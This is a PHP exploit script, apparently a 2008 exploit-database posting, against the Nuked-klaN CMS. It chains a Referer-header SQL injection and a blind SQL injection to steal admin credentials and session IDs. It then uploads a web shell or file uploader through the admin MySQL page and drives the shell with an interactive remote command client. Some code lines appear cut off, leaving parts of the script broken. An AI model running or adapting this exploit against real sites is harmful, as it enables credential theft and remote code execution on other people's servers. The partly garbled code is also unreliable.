Nuked-klaN <= 1.7.7 / <= SP4.4 Multiple Vulnerabilities Exploit
===============================================================


<?php
#
# Name:    Nuked-klaN <= 1.7.7 and <= SP4.4 Multiple Vulnerabilities Exploit
# Credits: Charles FOL 
# Date:    14/10/2008
#
# Special thanks to Louis for remembering me I had to finish it =)
#
# VULNERABILITY DETAILS
# ---------------------
#
# Nuked-klaN suffers from a vulnerability due to HTTP_REFERER, which is not
# correctly  filtered  before being inserted in  nuked_stats_visitor table.
#
# If HTTP headers are not addslashes()&#039;d by PHP,  it could lead to a INSERT
# SQL injection.
#
# In function view_referer() (visits.php),  referers are extracted from the 
# database to perform an other SQL query, without being secured in between.
# This leads to a blind SQL injection.
#
# Theses injections are  only possible if Nuked-klaN (NK) considers us as a
# new user, because else it won&#039;t touch the nuked_stats_visitor table.
# For this,  we can use X-Forwarded-For HTTP header to specify NK a new IP,
# to be considered as a new user, and therefore access the database.
# NK automaticaly tries to resolve our host (using gethostbyaddr()), and it
# could be very long if the IP is not corresponding to a real one,  because
# the default timeout is ~3 seconds, and that&#039;s very unconvenient for blind
# SQL injection.
# In order to solve this,  we can try to  generate IPs that might be valid,
# using, for example, a known BASE (the first two numbers), and randomizing
# the two other numbers.
#
# Stats can be disabled, or not accessible for users or visitors.
# In the last case we can&#039;t get query results,  so the unique way to inject
# is BENCHMARK method, but this implies that the headers are not addslashed
# by PHP, but this method is not implemented in this exploit.
#
# If we got an admin session or login, we can spawn a remote shell/uploader
# using the NK "MySQL administration",  but PHP safe_mode must be disabled.
#
# This exploit uses  all these vulnerabilities to spawn a shell/uploader or
# to simply obtain admin credentials.
#
# EXPLOIT MAP
# -----------
#
# (ERRORS ARE THIS WAY ->)
# 
# +---------------------------+
# | Check stats accessibility |->exit()
# +---------------------------+
#   |
#   |  +---------------------------------+  +-----------------------------------------------+
#   +->| Spoof referer to corrupt INSERT |->| Spoof referer to corrupt view_referer() query |->exit()
#      | query and look for results      |  | (blind sql injection)                         |
#      +---------------------------------+  +-----------------------------------------------+
#        |                                    |
#        |  +--------------------------+      | +---------------------------------------------+
#        +->| Did we find an admin SID |<-----+ | We only have a login and a hashed password, |
#           | or not ?                 |------->| we have to crack it and use -admin          |
#           +--------------------------+        +---------------------------------------------+
#             |
#             |  +-------------------------------------------------+
#             +->| Login as admin and spawn an uploader or a shell |
#                | using "MySQL administration"                    |
#                +-------------------------------------------------+
#
# SOLUTION
# --------
# The best way to secure your Nuked-klaN is disabling stats using the admin
# panel.
# If you wan&#039;t to keep stats activated, you have to addslashes HTTP_REFERER
# in nuked.php and in visits.php.
#
#
# THIS IS FOR EDUCATION PURPOSES ONLY, as usual.
#

error_reporting(E_ALL ^ E_NOTICE);

define(&#039;MSG_INFO&#039;, 1);
define(&#039;MSG_OKAY&#039;, 2);
define(&#039;MSG_ERROR&#039;, 3);
define(&#039;MSG_QUESTION&#039;, 4);

define(&#039;AGENT&#039;, &#039;Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16&#039;);
define(&#039;IPBASE&#039;, &#039;82.237.&#039;);

define(&#039;UPCODE&#039;, &#039;<?php if(isset($_SERVER[\&#039;HTTP_SHELL\&#039;])) {$h=fopen(\&#039;w00t.php\&#039;, \&#039;w+\&#039;);if(!$h || fputs($h, \&#039;<file>\&#039;)) exit(\&#039;--NOTDONE--\&#039;);fclose($h);exit(\&#039;--DONE--\&#039;);}else{include(\&#039;./Includes/blocks/block_login.php\&#039;);$blok[type]=\&#039;login\&#039;;} ?>&#039;);
define(&#039;SHCODE&#039;, &#039;<?php if(isset($_SERVER[\&#039;HTTP_SHELL\&#039;])) {print 123456789;eval($_SERVER[\&#039;HTTP_SHELL\&#039;]);print 123456789;exit();}else{include(\&#039;./Includes/blocks/block_login.php\&#039;);$blok[type]=\&#039;login\&#039;;} ?>&#039;);

$nk = new nk();

class nk
{
	var $proxy;
	
	var $user;
	var $admin;
	var $suser;
	var $sadmin;
	var $mode;
	var $url;
	var $year;
	
	var $ips = array();
	var $queries;
	var $www;
	
	function nk()
	{
		$this->header();
		$this->usage();
		
		$this->setParameters();
		$this->controlParameters();
		
		$this->main();
	}
	
	function close()
	{
		$this->msg();
		exit(0);
	}
	
	# Main function, what and when.
	function main()
	{
		# Admin login not specified
		if(!$this->sadmin)
		{
			$this->setQueries(0);
			$this->checkStatsAccessibility();
			$this->sendInsertQuery();
		
			# Got the credentials =)
			if($this->getCredentials())
			{
				$this->dumpCredentials();
			}
			elseif($this->blindQueries())
			{
				if($this->mode != 2 && !$this->admin[&#039;sid&#039;])
				{
					$this->msg(&#039;There is no active admin session, try with "-mode 2"&#039;, MSG_ERROR);
					exit();
				}
				
				$this->file = str_replace(&#039;$_SERVER[\&#039;HTTP_SHELL\&#039;]&#039;, &#039;stripslashes($_SERVER[\&#039;HTTP_SHELL\&#039;])&#039;, $this->file);
			}
			# No attack worked
			else
			{
				$this->msg(&#039;Exploit failed, stats might be disabled.&#039;, MSG_ERROR);
				exit();
			}
		}
		
		$this->makeadmin();
		$this->conclude();
	}
	
	# Define queries in function of the current mode
	function setQueries($mode)
	{
		$this->queries   = array();
		
		if(!$mode)
		{
			# User queries
			
			# Session queries
			if($this->mode != 2)
			{
			}
		}
		else
		{
			list($day, $month, $year) = explode(&#039;:&#039;, date(&#039;d:m:Y&#039;));
		}
		
		foreach($this->queries as $k => $v)
	}
	
	# Informs of the stats accessibility
	function checkStatsAccessibility()
	{
		$this->msg(&#039;Checking statistics accessibility ...&#039;, MSG_INFO, false);
		
		$accessibility = $this->areStatsReachable();
		
		if($accessibility == 1)
		{
			$this->msg(&#039;Statistics are reachable, but require authentification&#039;, MSG_OKAY);
			
			if(!$this->suser)
			{
				$this->msg(&#039;Please create an user and specify it using -user parameter&#039;, MSG_ERROR);
				exit();
			}
			else
			{
				$this->makeuser();
			}
		}
		elseif($accessibility == 0)
		{
			$this->msg(&#039;Statistics are reachable as a visitor&#039;, MSG_OKAY);
		}
		else
		{
			$this->msg(&#039;Statistics are NOT reachable or activated&#039;, MSG_ERROR);
			exit();
		}
	}
		
	# Determine if stats are accessible, and under which conditions
	function areStatsReachable()
	{
		$this->wwwinit(0);
		$this->www->addheader(&#039;Referer&#039;, &#039;http://test.com/&#039;);
		$this->www->get($this->url . &#039;index.php?file=Stats&nuked_nude=visits&op=view_referer&#039;);
		
			return -1;
			return 1;
			
			return -1;
		
		return 0;
	}
	
	# Send the spoofed referer in order to insert interresting
	# informations in the nuked_stats_visitors table
	function sendInsertQuery()
	{
		$time = time()+60;
		
		$this->msg(&#039;Sending INSERT query ...&#039;, MSG_INFO, false);
		
		# End the first row
		$sql  = "http://google.com/&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;0&#039;), ";
		
		# For each query, a new row
		foreach($this->queries as $key => $query)
		{
			$sql .= "(&#039;&#039;, &#039;&#039;, &#039;0.0.0.0&#039;, &#039;attack&#039;, &#039;Mozilla&#039;, &#039;Windows&#039;, CONCAT(&#039;<!--:$key:&#039;, ($query), &#039;:-->&#039;), &#039;1&#039;, &#039;1&#039;, &#039;" .$this->year . "&#039;, &#039;1&#039;, &#039;$time&#039;), ";
		}
		
		# End this with the beginning of a row, to have a valid SQL query
		$sql .= "(&#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;&#039;, &#039;";
		
		# Let&#039;s send it
		$this->wwwinit(0);
		$this->www->addheader(&#039;Referer&#039;, $sql);
		$this->www->get($this->url);
		
		$this->msg(&#039;Sent INSERT query       &#039;, MSG_OKAY);
	}
	
	# Get insert query result in stats page, credentials
	function getCredentials()
	{
		$this->admin = array();
		
		$this->msg(&#039;Retrieving credentials ...&#039;, MSG_INFO, false);
		
		$this->wwwinit(1);
		$this->www->get($this->url . &#039;index.php?file=Stats&nuked_nude=visits&op=view_referer&oyear=&#039; . $this->year);
		
		{
			$this->msg(&#039;Unable to reach credentials&#039;, MSG_ERROR);
			return false;
		}
		
		for($i=0;$i<sizeof($data[0]);$i++)
		{
			$this->admin[$data[1][$i]] = $data[2][$i];
		}
			
		$this->msg(&#039;Got the credentials =)    &#039;, MSG_OKAY);
		
		return true;
	}
	
	# Dump $this->user content
	function dumpCredentials()
	{
		$display = array
		(
			&#039;User      : &#039; => &#039;name&#039;,
			&#039;Password  : &#039; => &#039;password&#039;,
			&#039;UserID    : &#039; => &#039;uid&#039;,
			&#039;SessionID : &#039; => &#039;sid&#039;,
		);
		
		foreach($display as $key => $value)
			if($this->admin[$value])
				$this->msg($key . $this->admin[$value], MSG_OKAY);
	}
	
	# Here we are on the second attack: we have to blind, but only
	function blindQueries()
	{
		$this->msg(&#039;Switching to blind mode, be (very) patient ...&#039;, MSG_INFO);
		
		if($this->mode != 2)
		{
			unset($this->queries[&#039;name&#039;]);
			unset($this->queries[&#039;password&#039;]);
		}
		
		foreach($this->queries as $key => $query)
		{
			$length = $key == &#039;password&#039; ? 32 : 20;
			
			if($key == &#039;sid&#039;)
			{
				$query = str_replace
				(
					&#039;(&#039; . $this->queries[&#039;uid&#039;] . &#039;)&#039;,
					"&#039;" . $this->admin[&#039;uid&#039;] . "&#039;",
					$query
				);
			}
				
			switch($key)
			{
				case &#039;name&#039;:     $display = &#039;User      : &#039;; break;
				case &#039;password&#039;: $display = &#039;Password  : &#039;; break;
				case &#039;sid&#039;:      $display = &#039;SessionID : &#039;; break;
				case &#039;uid&#039;:      $display = &#039;UserID    : &#039;; break;
			}
			
			$this->msg($display, MSG_QUESTION, false);
			if(!($this->admin[$key] = $this->blind($query, $length))) return true;
			$this->msg($display . $this->admin[$key], MSG_OKAY);
		}
		
		return true;
	}
	
	# SQL Blind function
	# Referer SQL field only supports 200 characters,
	# so we use a special sql injection to be sure it
	# will work fine and fast enought.
	#
	# 1. Charset
	# 2. Dichotomy
	#
	function blind($query, $nbchars)
	{
		$result  = &#039;&#039;;
		
		for($p=1;$p<=$nbchars;$p++)
		{
			$letter = &#039;&#039;;
			$sql    = "MID(($query),$p,1)";
			
			if($this->blind_is($sql))
			{
				if($this->blind_isChar($sql))
				{		
					if($this->blind_isMaj($sql))
						$charset = array(ord(&#039;A&#039;), ord(&#039;Z&#039;));
					else
						$charset = array(ord(&#039;a&#039;), ord(&#039;z&#039;));
				}
				else
					$charset = array(ord(&#039;0&#039;), ord(&#039;9&#039;));
			}
			else
				break;
				
			$add = $charset[0];
			
			for($pos=$charset[1]-$charset[0];$pos>2;$pos=intval($pos/2+0.5))
			{
				$s = &#039;ORD(&#039; . $sql . &#039;) BETWEEN &#039; . $add . &#039; AND &#039; . ($add+$pos);
				if(!$this->blind_test($s)) $add += $pos;
			}
			
			$letter = &#039;&#039;;
			
			for($i=$add;$i<=$add+$pos+1;$i++)
			{
				$s = &#039;ORD(&#039; . $sql . &#039;)=&#039; . $i;
				if($this->blind_test($s))
				{
					$letter = chr($i);
					break;
				}
			}
			
			$result .= $letter;
			print $letter;
		}
		
		return $result;
	}
	
	function blind_is($sql)
	{
		return $this->blind_test("ORD($sql)!=0");
	}
	
	function blind_isChar($query)
	{
		return $this->blind_test("UPPER($query) BETWEEN &#039;A&#039; AND &#039;Z&#039;");
	}
	
	function blind_isMaj($query)
	{
		return $this->blind_test("ORD($query) BETWEEN 65 AND 90");
	}
	
	# Return true or false depending on the page result, before
	# setting up PHPsploit and the referer
	function blind_test($sql)
	{
		$site = $this->generateIP();
		$when = &#039;&oday=&#039; . date(&#039;d&#039;) . &#039;&omonth=&#039; . date(&#039;m&#039;) . &#039;&oyear=&#039; . date(&#039;Y&#039;);
		
		$this->wwwinit(0);
		$this->www->addheader(&#039;Referer&#039;, $this->year . $site . "&#039; OR 1=1 AND $sql AND &#039;A&#039;=&#039;A");
		
		# If we have to be user to reach stats
		if(sizeof($this->user))
		{
			$this->www->get($this->url . &#039;index.php&#039;);
			$this->wwwinit(1);
		}
			
		$this->www->get($this->url . &#039;index.php?file=Stats&nuked_nude=visits&op=view_referer&#039; . $when);
		
		{
			if($data[1] > 0)
				return true;
		}
		else
		{
			$this->msg(&#039;Error while blinding.&#039;, MSG_ERROR);
			exit();
		}
	}
		
	# Set up the admin
	function makeadmin()
	{
		# The current user is now the admin
		$this->user = $this->admin;
		
		# Determine if we have a session or just a name
		if($this->mode == 2)
		{
			exit();
		}
		elseif($this->sadmin)
		{
			$this->suser = $this->sadmin;
			$this->makeuser();
		}
		elseif($this->user[&#039;sid&#039;] && $this->user[&#039;uid&#039;])
		{
			$this->msg(&#039;Got a session, no login required&#039;, MSG_OKAY);
		}
		elseif($this->user[&#039;name&#039;] && $this->user[&#039;password&#039;])
		{
			$this->msg(&#039;Please crack the admin hash, and use -admin parameter&#039;, MSG_ERROR);
			exit();
		}
		else
		{
			$this->msg(&#039;How did you get there ?&#039;, MSG_ERROR);
			exit();
		}
		
		$this->user[&#039;aid&#039;] = $this->user[&#039;uid&#039;];
		$this->user[&#039;ip&#039;]  = &#039;127.0.0.1&#039;;
		
		$this->msg(&#039;Administrator status OK =)&#039;, MSG_OKAY);
	}
	
	# Conclude the attack: spawn a shell or an uploader
	function conclude()
	{
		# Initialise PHPsploit for the last time
		$this->wwwinit(1);
		$this->www->addheader(&#039;Referer&#039;, $this->url);
		
		# Actualize the queries
		$this->setQueries(1);
		
		$this->uploadavatar();
		$this->sendqueries();
		$this->loadshell();
	}
	
	function uploadavatar()
	{
		$this->msg(&#039;Uploading avatar ...&#039;, MSG_INFO, false);
		
		$fmdt = array
		(
			&#039;fichiernom&#039;  => array
							(
								&#039;frmdt_filename&#039; => &#039;one.jpg&#039;,
								&#039;frmdt_content&#039;  => $this->file,
							)
		);

		$this->www->formdata($fmdt);
		
		{
			$this->msg(&#039;Error while uploading avatar&#039;, MSG_ERROR);
			exit();
		}
		
		$this->msg(&#039;Avatar successfully uploaded (&#039; . basename($match[1]) . &#039;)&#039;, MSG_OKAY);
		
		$match = unpack(&#039;H*&#039;, $match[1]);
		
		$this->queries[1] = str_replace(&#039;<filename>&#039;, $match[1], $this->queries[1]);
	}
	
	function sendqueries()
	{
		$this->msg(&#039;Sending SQL queries &#039;, MSG_INFO, false);
		
		foreach($this->queries as $query)
		{
			$this->www->post($this->url . &#039;index.php?file=Admin&page=mysql&op=upgrade_db&#039;, &#039;upgrade=&#039; . $query);
			$this->msg(&#039;.&#039;, 0, false);
		}
		
		$this->msg(&#039;SQL queries sent        &#039;, MSG_OKAY);
	}
	
	function loadshell()
	{
		if($this->mode == 0)
		{
			$this->www->addheader(&#039;Shell&#039;, &#039;1&#039;);
			$this->www->get($this->url);
			
			if(strpos(&#039;--DONE--&#039;, $this->www->getcontent()))
				$this->msg(&#039;File created. URL: &#039; . $this->url . &#039;w00t.php&#039;, MSG_OKAY);
			else
			{
				# possible causes: safe_mode, open_basedir, file restrictions ...
				$this->msg(&#039;File was not created&#039;, MSG_ERROR);
			}
		}
		else
		{
			$this->msg(&#039;Shell spawned&#039;, MSG_OKAY);
			$this->msg();
			$sql = array(&#039;conf.inc.php&#039;, &#039;$global[\&#039;db_host\&#039;]&#039;, &#039;$global[\&#039;db_user\&#039;]&#039;, &#039;$global[\&#039;db_password\&#039;]&#039;, &#039;$global[\&#039;db_name\&#039;]&#039;);
		}
	}
	
	# Login as a specified user, and obtain a $uid and a $sid
	function createSession($user, $passwd, &$uid, &$sid)
	{
		$this->wwwinit(0);
		$this->www->addheader(&#039;Referer&#039;, $this->url . &#039;index.php&#039;);
		$this->www->post($this->url . &#039;index.php?file=User&nuked_nude=index&op=login&#039;, "pseudo=$user&pass=$passwd&remember_me=ok");
		
		
		$sid = $sid[1];
		$uid = $uid[1];
		
		if($uid && $sid)
			return true;
		
		return false;
	}
	
	# Login user and set his informations
	function makeuser()
	{	
		list($user, $passwd) = explode(&#039;:&#039;, $this->suser);
		
		$this->user = array();
		
		$this->msg(&#039;Logging in as &#039; . $user, MSG_INFO, false);
		
		if($this->createSession($user, $passwd, $uid, $sid))
		{
			$this->user[&#039;name&#039;]     = $user;
			$this->user[&#039;password&#039;] = $passwd;
			$this->user[&#039;uid&#039;]      = $uid;
			$this->user[&#039;sid&#039;]      = $sid;
			$this->user[&#039;ip&#039;]       = $this->generateIP();
			
			$this->msg(&#039;Loggued in as &#039; . $user . &#039; (uid=&#039; . $uid . &#039;)&#039;, MSG_OKAY);
		}
		else
		{
			$this->msg(&#039;Unable to log in as &#039; . $user, MSG_ERROR);
			exit();
		}
	}
	
	# Initialize PHPsploit (with a new identity)
	function wwwinit($mode)
	{	
		$this->www->reset();
		$this->www->agent(AGENT);
		
		if($mode && sizeof($this->user))
			$this->wwwuser();
		else
			$this->www->addheader(&#039;X-Forwarded-For&#039;, $this->generateIP());
	}

	# Set user cookies and headers
	function wwwuser()
	{	
		$cookies = array();
		
		if($this->user[&#039;uid&#039;]) $cookies[&#039;user_id&#039;]       = $this->user[&#039;uid&#039;];
		if($this->user[&#039;sid&#039;]) $cookies[&#039;sess_id&#039;]       = $this->user[&#039;sid&#039;];	
		if($this->user[&#039;aid&#039;]) $cookies[&#039;admin_session&#039;] = $this->user[&#039;aid&#039;];
			
		foreach($cookies as $k => $v)
		
		// yes it&#039;s not a cookie
		$this->www->addheader(&#039;X-Forwarded-For&#039;, $this->user[&#039;ip&#039;]);
	}
	
	# Make an IP which can be gethostbyaddr()&#039;ed, for speed
	# reasons
	function generateIP()
	{
		do
		{
			$ip = IPBASE . rand(1, 20) . &#039;.&#039; . rand(1, 250);
		}
		while(in_array($ip, $this->ips));
		
		$this->ips[] = $ip;
		
		return $ip;
	}
	
	function msg($msg = &#039;&#039;, $type = 0, $n = true)
	{
		$display = $n ? "\r" : &#039;&#039;;

		switch($type)
		{
			case MSG_INFO:     $display .= &#039;[*] &#039;; break;
			case MSG_OKAY:     $display .= &#039;[+] &#039;; break;
			case MSG_ERROR:    $display .= &#039;[-] &#039;; break;
			case MSG_QUESTION: $display .= &#039;[?] &#039;; break;
		}

		$display .= $msg;

		$display .= $n ? "\n" : &#039;&#039;;

		print $display;
	}
	
	function header()
	{
		$this->msg();
		$this->msg(&#039;   Nuked-klaN 1.7.7 and SP4.4 Multiple Vulnerabilities Exploit&#039;);
		$this->msg(&#039;     by Charles FOL <charlesfol[at]hotmail.fr>&#039;);
		$this->msg();
	}
	
	function usage()
	{
		global $argc;
		
		if($argc<3)
		{
			$this->msg(&#039; usage: ./nk_exploit.php -url <url> [options]&#039;);
			$this->msg();
			$this->msg(&#039; Options: -mode    0: Remote Upload (default)&#039;);
			$this->msg(&#039;                   1: Remote Code Execution&#039;);
			$this->msg(&#039;                   2: Admin Hash Extraction&#039;);
			$this->msg(&#039;          -admin   If you have an admin account.&#039;);
			$this->msg(&#039;          -user    If stats page need registration.&#039;);
			$this->msg(&#039;          -proxy   If you want to use a proxy.&#039;);
			$this->msg(&#039;          -file    If you wanna upload a specific file&#039;);
			$this->msg(&#039;                   else it will upload a simple uploader.&#039;);
			$this->msg();
			$this->msg(&#039; eg: ./nk_exploit.php -url http://localhost/nk/ -admin real:passw0rd&#039;);
			$this->msg(&#039; eg: ./nk_exploit.php -url http://localhost/nk/ -file cshell.php -proxy localhost:8118&#039;);
			
			$this->close();
		}
	}
	
	function setParameters()
	{
		$this->www     = new phpsploit();
		$this->year    = rand(1000, 1500);
		$this->url     = $this->getParameter(&#039;url&#039;, true);
		$this->mode    = $this->getParameter(&#039;mode&#039;, false, 0);
		$this->suser   = $this->getParameter(&#039;user&#039;, false);
		$this->sadmin  = $this->getParameter(&#039;admin&#039;, false);
		$this->proxy   = $this->getParameter(&#039;proxy&#039;, false);
		$this->file    = $this->getParameter(&#039;file&#039;, false);
	}
	
	function controlParameters()
	{
		if($this->mode == 0)
		{
			if($this->file)
				$this->file = file_get_contents($this->file);
			else
				$this->file = &#039;<?php if(isset($_GET[\&#039;del\&#039;])){unlink(basename($_SERVER[\&#039;PHP_SELF\&#039;]));exit();} if&#039;
				            . &#039;(isset($_POST[\&#039;upload\&#039;])){if(!move_uploaded_file($_FILES[\&#039;file\&#039;][\&#039;tmp_name\&#039;], &#039;
				            . &#039;"./".$_FILES[\&#039;file\&#039;][\&#039;name\&#039;])) echo("<center>Error ".$_FILES[\&#039;file\&#039;][\&#039;error\&#039;&#039;
				            . &#039;]."</center>");else echo "<center>File uploaded</center>"; } ?><form method="post" e&#039;
				            . &#039;nctype="multipart/form-data"><center><input type="file" name="file"><input type="sub&#039;
				            . &#039;mit" name="upload" value="Upload"></center></form>&#039;;

			$this->file = str_replace(&#039;<file>&#039;, str_replace("&#039;", "\&#039;", $this->file), UPCODE);
		}
		else
			$this->file = SHCODE;
		
		if($this->proxy)
			$this->www->proxy($this->proxy);
	}
	
	function getParameter($parameter, $required = false, $default = &#039;&#039;)
	{
		global $argv, $argc;
		
		for($i=0;$i<$argc;$i++)
		{
			if($argv[$i] == &#039;-&#039; . $parameter)
				return $argv[$i+1];
		}
		
		if($required)
		{
			$this->msg(&#039;-&#039; . $parameter . &#039; parameter is required.&#039;, MSG_ERROR);
			$this->close();
		}
		
		return $default;
	}
}

# PHPreter (a bit modified).
# Find original version on http://real.o-n.fr/

/*
 * Copyright (c) Charles FOL
 *
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * TITLE:          PHPreter
 * AUTHOR:         Charles FOL <charlesfol[at]hotmail.fr>
 * VERSION:        1.0
 * LICENSE:        GNU General Public License
 *
 * This is a really simple class with permits to exec SQL, PHP or CMD
 * on a remote host using the HTTP "Shell" header.
 *
 *
 * Sample code:
 * [host][sql]# mode=cmd
 * [host][cmd]# id
 * uid=2176(u47170584) gid=600(ftpusers)
 * 
 * [host][cmd]# mode=php
 * [host][php]# echo phpversion();
 * 4.4.8
 * [host][php]# mode=sql
 * [host][sql]# SELECT version(), user()
 * --------------------------------------------------
 *  version()           | 5.0.51a-log
 *  user()              | dbo225004932@74.208.16.148
 * --------------------------------------------------
 * 
 * [host][sql]#
 *
 */

{
	var $url;
	var $host;
	var $port;
	var $page;
	
	var $mode;
	
	var $ssql;
	
	var $prompt;
	var $phost;
	
	var $regex;
	var $data;
	
	/**
	 * __construct()
	 *
	 * @param url      The url of the remote shell.
	 * @param regexp   The regex to catch cmd result.
	 * @param mode     Mode: php, sql or cmd.
	 * @param sql      An array with the file to include,
	 *                 and sql vars
	 * @param clear    Determines if clear() is called
	 *                 on startup
	 */
	{
		$this->url = $url;
		
		$this->regex = &#039;#&#039;.$regexp.&#039;#is&#039;;
		
		#
		# Set data
		#
		
		$infos         =	parse_url($this->url);
		$this->host    =	$infos[&#039;host&#039;];
		$this->port    =	isset($infos[&#039;port&#039;]) ? $infos[&#039;port&#039;] : 80;
		$this->page    =	$infos[&#039;path&#039;];
		
		# www.(site).com
		$host_tmp      =	explode(&#039;.&#039;,$this->host);
		$this->phost   =	$host_tmp[ count($host_tmp)-2 ];
		
		#
		# Set up MySQL connection string
		#
		if(!sizeof($sql))
			$this->ssql = &#039;&#039;;
		elseif(sizeof($sql) == 5)
		{
			$this->ssql = "include(&#039;$sql[0]&#039;);"
			            . "mysql_connect($sql[1], $sql[2], $sql[3]);"
			            . "mysql_select_db($sql[4]);";
		}
		else
		{
			$this->ssql = ""
			            . "mysql_connect(&#039;$sql[0]&#039;, &#039;$sql[1]&#039;, &#039;$sql[2]&#039;);"
			            . "mysql_select_db(&#039;$sql[3]&#039;);";
		}
		
		$this->setmode($mode);
		
		#
		# Main Loop
		#

		if($clear) $this->clear();
		print $this->prompt;

		{
			# change mode
				$this->setmode($array[3]);
			
			# clear data
				$this->clear();
			
			# else
			else print $this->exec($cmd);
			
			print $this->prompt;
		}
	}
	
	/**
	 * clear()
	 * Just clears ouput, printing &#039;\n&#039;x50
	 */
	function clear()
	{
		print str_repeat("\n", 50);
		return 0;
	}
	
	/**
	 * setmode()
	 * Set mode (PHP, CMD, SQL)
	 * You don&#039;t have to call it.
	 * use mode=[php|cmd|sql] instead,
	 * in the prompt.
	 */
	function setmode($newmode)
	{
		$this->mode = strtolower($newmode);
		$this->prompt = &#039;[&#039;.$this->phost.&#039;][&#039;.$this->mode.&#039;]# &#039;;
		
		switch($this->mode)
		{
			case &#039;cmd&#039;:
				$this->data = &#039;system(\&#039;<CMD>\&#039;);&#039;;
				break;
			case &#039;php&#039;:
				$this->data = &#039;&#039;;
				break;
			case &#039;sql&#039;:
				$this->data = $this->ssql
				            . &#039;$q = mysql_query(\&#039;<CMD>\&#039;) or print(str_repeat("-",50)."\n".mysql_error()."\n");&#039;
				            . &#039;print str_repeat("-",50)."\n";&#039;
				            . &#039;while($r=mysql_fetch_array($q,MYSQL_ASSOC))&#039;
				            . &#039;{&#039;
				            .    &#039;foreach($r as $k=>$v) print " ".$k.str_repeat(" ", (20-strlen($k)))."| $v\n";&#039;
				            .    &#039;print str_repeat("-",50)."\n";&#039;
				            . &#039;}&#039;;
				break;
		}
		return $this->mode;
	}

	/**
	 * exec()
	 * Execute any query and catch the result.
	 * You don&#039;t have to call it.
	 */
	function exec($cmd)
	{
		if(!strlen($this->data))	$shell = $cmd;
		else                    	$shell = str_replace(&#039;<CMD>&#039;, addslashes($cmd), $this->data);
		
		$fp = fsockopen($this->host, $this->port, $errno, $errstr, 30);
		
		$req  = "GET " . $this->page . " HTTP/1.1\r\n";
		$req .= "Host: " . $this->host . ( $this->port!=80 ? &#039;:&#039;.$this->port : &#039;&#039; ) . "\r\n";
		$req .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14\r\n";
		$req .= "X-Forwarded-For: 127.0.0.1\r\n"; // here is the mod.
		$req .= "Shell: $shell\r\n";
		$req .= "Connection: close\r\n\r\n";

		fputs($fp, $req);
		
		$content = &#039;&#039;;
		while(!feof($fp)) $content .= fgets($fp, 128);
		
		fclose($fp);
		
		# Remove headers
		$data    = explode("\r\n\r\n", $content);
		$headers = array_shift($data);
		$content = implode("\r\n\r\n", $data);
		
			$content = $this->unchunk($content);
	
		
		if($data[1][ strlen($data)-1 ] != "\n") $data[1] .= "\n";
		
		return $data[1];
	}
	
	/**
	 * unchunk()
	 * This function aims to remove chunked content&#039;s sizes which
	 * are put by the apache server when it uses chunked
	 * transfert-encoding.
	 */
	function unchunk($data)
	{
		$dsize  = 1;
		$offset = 0;
		
		while($dsize>0)
		{
			$hsize_size = strpos($data, "\r\n", $offset) - $offset;
			
			$dsize = hexdec(substr($data, $offset, $hsize_size));
			
			# Remove $hsize\r\n from $data
			$data = substr($data, 0, $offset) . substr($data, ($offset + $hsize_size + 2) );
			
			$offset += $dsize;
			
			# Remove the \r\n before the next $hsize
			$data = substr($data, 0, $offset) . substr($data, ($offset+2) );
		}
		
		return $data;
	}
}

# PHPsploitClass

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don&#039;t have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this->recv ServerResponse
